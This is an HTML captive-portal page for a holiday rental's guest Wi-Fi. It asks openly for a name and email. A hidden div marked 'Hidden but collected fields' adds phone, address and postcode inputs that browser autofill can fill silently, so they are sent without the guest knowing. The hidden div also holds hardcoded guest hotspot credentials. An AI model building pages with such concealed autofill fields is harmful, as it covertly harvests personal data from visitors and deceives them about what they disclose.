
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>La Manga Club Rentals - Wi-Fi Access</title>
  <link rel="stylesheet" href="/captive-portal.css">
</head>
<body>
  <div class="wifi-card">
    <div class="logo-container">
      <div class="logo-placeholder">Logo</div>
    </div>
    
    <div class="text-center">
      <h1>Connect to Wi-Fi</h1>
      <p class="subtitle">Please enter your details to continue</p>
    </div>
    
    <form action="http://192.0.2.1/login.html" method="POST" id="wifi-form">
      <!-- Visible Form Fields -->
      <div class="form-group">
        <label for="fullName">Full Name</label>
        <input 
          type="text" 
          id="fullName" 
          name="fullName" 
          autocomplete="name" 
          placeholder="Enter your full name" 
          required
        >
      </div>
      
      <div class="form-group">
        <label for="email">Email Address</label>
        <input 
          type="email" 
          id="email" 
          name="email" 
          autocomplete="email" 
          placeholder="Enter your email address" 
          required
        >
      </div>
      
      <!-- Hidden but collected fields -->
      <div class="visually-hidden">
        <input type="tel" id="phone" name="phone" autocomplete="tel">
        <input type="text" id="address" name="address" autocomplete="address-line1">
        <input type="text" id="postcode" name="postcode" autocomplete="postal-code">
        
        <!-- MikroTik Hotspot Integration -->
        <input type="text" name="username" id="username" value="guest">
        <input type="text" name="password" value="guest">
      </div>
      
      <!-- Submit Button -->
      <button type="submit" id="submitBtn">Connect to Wi-Fi</button>
      
      <!-- Footer Text -->
      <p class="footer-text">
        By connecting, you agree to our Wi-Fi terms.
      </p>
    </form>
  </div>

  <script src="/captive-portal.js"></script>
</body>
</html>
